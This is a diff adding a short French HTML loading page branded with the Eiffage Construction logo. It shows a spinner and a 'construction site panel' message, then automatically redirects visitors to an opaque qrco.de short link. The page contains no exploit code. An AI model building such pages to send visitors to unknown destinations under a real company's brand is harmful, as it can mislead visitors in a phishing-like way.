@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="fr">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Chargement - Eiffage Construction</title>
+    <style>
+      body {
+        margin: 0;
+        background-color: #ffffff;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        height: 100vh;
+        font-family: Arial, sans-serif;
+        text-align: center;
+        animation: fadeIn 1s ease-in-out;
+      }
+
+      img {
+        width: 150px;
+        margin-bottom: 20px;
+        opacity: 0;
+        animation: fadeIn 2s forwards;
+      }
+
+      .spinner {
+        width: 40px;
+        height: 40px;
+        border: 5px solid #eee;
+        border-top: 5px solid #cc0000;
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+        margin-bottom: 20px;
+      }
+
+      p {
+        font-size: 1.2rem;
+        color: #333;
+        margin: 0 20px;
+        opacity: 0;
+        animation: fadeIn 2s 0.5s forwards;
+      }
+
+      @keyframes spin {
+        0% {
+          transform: rotate(0deg);
+        }
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+
+      @keyframes fadeIn {
+        to {
+          opacity: 1;
+        }
+      }
+
+      @media (max-width: 600px) {
+        img {
+          width: 120px;
+        }
+        p {
+          font-size: 1rem;
+        }
+      }
+    </style>
+    <script>
+      setTimeout(function () {
+        document.body.style.animation = 'fadeOut 1s ease-in-out forwards';
+        setTimeout(function () {
+          window.location.href = "https://qrco.de/bfumZH";
+        }, 1000);
+      }, 3000);
+    </script>
+    <style>
+      @keyframes fadeOut {
+        to {
+          opacity: 0;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <img
+      src="https://upload.wikimedia.org/wikipedia/commons/3/32/Logo_Eiffage_Construction.png"
+      alt="Logo Eiffage Construction"
+    />
+    <div class="spinner"></div>
+    <p>Chargement du panneau de chantier Eiffage Construction.</p>
+  </body>
+</html>
